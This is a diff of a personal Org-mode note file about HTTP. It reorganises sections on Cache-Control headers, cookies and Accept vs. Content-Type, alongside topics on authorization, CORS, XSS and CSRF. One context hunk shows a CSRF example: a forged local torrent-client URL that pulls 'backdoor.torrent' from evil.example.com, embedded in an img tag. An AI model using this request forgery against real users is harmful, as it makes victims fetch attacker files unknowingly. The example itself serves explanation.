@@ -1,23 +1,77 @@
 #+TITLE: HTTP
 
 * Table of Contents :TOC_2_gh:
-- [[#how-to][How-to]]
 - [[#topics][Topics]]
+  - [[#cache-control][Cache Control]]
+  - [[#cookies][Cookies]]
+  - [[#accept-vs-content-type][Accept vs. Content-Type]]
   - [[#when-is-the-authorization-header-automatically-sent-by-the-browser][When is the Authorization header automatically sent by the browser?]]
   - [[#basic-access-authentication][Basic access authentication]]
   - [[#web-storage-vs-cookies][Web Storage vs. Cookies]]
   - [[#cors-cross-origin-resource-sharing][CORS (Cross Origin Resource Sharing)]]
   - [[#xss-cross-site-scripting][XSS (Cross-site scripting)]]
   - [[#csrf-cross-site-request-forgery][CSRF (Cross-site request forgery)]]
-- [[#reference][Reference]]
-  - [[#cache-control][Cache Control]]
-  - [[#cookies][Cookies]]
 - [[#terminology][Terminology]]
   - [[#url-vs-uri-vs-urn][URL vs URI vs URN]]
   - [[#endpoint][Endpoint]]
 
-* How-to
 * Topics
+** Cache Control
+- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control
+*** Request
+#+BEGIN_EXAMPLE
+  Cache-Control: max-age=<seconds>
+  Cache-Control: max-stale[=<seconds>]
+  Cache-Control: min-fresh=<seconds>
+  Cache-Control: no-cache 
+  Cache-Control: no-store
+  Cache-Control: no-transform
+  Cache-Control: only-if-cached
+#+END_EXAMPLE
+
+*** response
+#+BEGIN_EXAMPLE
+  Cache-Control: must-revalidate
+  Cache-Control: no-cache
+  Cache-Control: no-store
+  Cache-Control: no-transform
+  Cache-Control: public
+  Cache-Control: private
+  Cache-Control: proxy-revalidate
+  Cache-Control: max-age=<seconds>
+  Cache-Control: s-maxage=<seconds>
+#+END_EXAMPLE
+
+** Cookies
+- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+- https://stackoverflow.com/questions/1336126/does-every-web-request-send-the-browser-cookies
+
+#+BEGIN_QUOTE
+Yes, as long as the URL requested is within the same domain and path defined in the cookie
+(and all of the other restrictions -- secure, httponly, not expired, etc) hold,
+then the cookie will be sent for every request.
+#+END_QUOTE
+
+*** Set-Cookie
+#+BEGIN_EXAMPLE
+  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+#+END_EXAMPLE
+
+- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies
+- Secure   :: The cookies that are set can only be sent over HTTPS
+- HttpOnly :: The cookies that are set cannot be retrieved with JS. Only be sent to the designated server.
+
+** Accept vs. Content-Type
+- https://webmasters.stackexchange.com/questions/31212/difference-between-the-accept-and-content-type-http-headers
+
+#+BEGIN_QUOTE
+~Accept~ header is used by HTTP clients to tell the server what content types they'll accept.
+The server will then send back a response, which will include a ~Content-Type~ header
+telling the client what the content type of the returned content actually is.
+#+END_QUOTE
+
+The ~Content-Type~ header on HTTP Request is for the payload of ~POST~ or ~PUT~, which tells the server how the payload is formed.
+
 ** When is the Authorization header automatically sent by the browser?
 - https://stackoverflow.com/questions/15427650/when-is-the-authorization-header-automatically-sent-by-the-browser
 - https://security.stackexchange.com/questions/172637/will-authorization-bearer-in-request-header-fix-csrf-attacks
@@ -144,52 +198,6 @@ Force a ~.torrent~ file download:
    - ~http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent~
 3. Inject the forged url as ~<img>~ tag like: ~<img src="<url>">~
 4. The victim opens the page containg the tag and download ~backdoor.torrent~ inadvertently.
-
-* Reference
-** Cache Control
-- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control
-*** Request
-#+BEGIN_EXAMPLE
-  Cache-Control: max-age=<seconds>
-  Cache-Control: max-stale[=<seconds>]
-  Cache-Control: min-fresh=<seconds>
-  Cache-Control: no-cache 
-  Cache-Control: no-store
-  Cache-Control: no-transform
-  Cache-Control: only-if-cached
-#+END_EXAMPLE
-
-*** response
-#+BEGIN_EXAMPLE
-  Cache-Control: must-revalidate
-  Cache-Control: no-cache
-  Cache-Control: no-store
-  Cache-Control: no-transform
-  Cache-Control: public
-  Cache-Control: private
-  Cache-Control: proxy-revalidate
-  Cache-Control: max-age=<seconds>
-  Cache-Control: s-maxage=<seconds>
-#+END_EXAMPLE
-
-** Cookies
-- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
-- https://stackoverflow.com/questions/1336126/does-every-web-request-send-the-browser-cookies
-
-#+BEGIN_QUOTE
-Yes, as long as the URL requested is within the same domain and path defined in the cookie
-(and all of the other restrictions -- secure, httponly, not expired, etc) hold,
-then the cookie will be sent for every request.
-#+END_QUOTE
-
-*** Set-Cookie
-#+BEGIN_EXAMPLE
-  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
-#+END_EXAMPLE
-
-- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies
-- Secure   :: The cookies that are set can only be sent over HTTPS
-- HttpOnly :: The cookies that are set cannot be retrieved with JS. Only be sent to the designated server.
 
 * Terminology
 ** URL vs URI vs URN
